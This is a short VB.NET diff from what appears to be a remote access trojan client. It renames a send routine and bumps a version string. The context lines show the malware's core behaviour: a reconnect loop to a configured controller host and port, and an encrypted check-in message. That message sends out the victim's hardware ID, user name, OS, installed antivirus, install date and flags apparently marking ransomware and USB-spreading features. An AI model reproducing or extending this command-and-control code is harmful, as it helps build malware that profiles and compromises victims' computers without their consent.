@@ -8,7 +8,7 @@
         Public Shared T1 As New Threading.Thread(AddressOf Connect)
         Public Shared CNT As Boolean = False
 
-        Public Shared Sub Send(ByVal b As Byte())
+        Public Shared Sub SendData(ByVal b As Byte())
             If CNT = False Then Exit Sub
             Try
                 Dim r As Object = New IO.MemoryStream
@@ -22,7 +22,7 @@
         End Sub
 
         Public Shared Sub Send(ByVal S As String)
-            Send(SB(C_Encryption.AES_Encrypt(S)))
+            SendData(SB(C_Encryption.AES_Encrypt(S)))
         End Sub
 
         Public Shared Sub Connect()
@@ -98,7 +98,7 @@ e:      ' clear things and ReConnect
                 C.Client.Connect(C_Settings.HOST, C_Settings.PORT)
                 CNT = True
                 'Send info to server
-                                    Send("info" & SPL & C_ID.HWID & SPL & C_ID.UserName & SPL & "v0.1" & SPL & C_ID.MyOS & " " & C_ID.Bit & SPL & C_ID.INDATE & SPL & C_ID.AV & SPL & C_ID.Rans & SPL & C_ID.USBSP & SPL & " " & SPL & " ")
+                Send("info" & SPL & C_ID.HWID & SPL & C_ID.UserName & SPL & "v0.1.1" & SPL & C_ID.MyOS & " " & C_ID.Bit & SPL & C_ID.INDATE & SPL & C_ID.AV & SPL & C_ID.Rans & SPL & C_ID.USBSP & SPL & " " & SPL & " ")
             Catch ex As Exception
                 Threading.Thread.CurrentThread.Sleep(R.Next(5000))
                 GoTo e
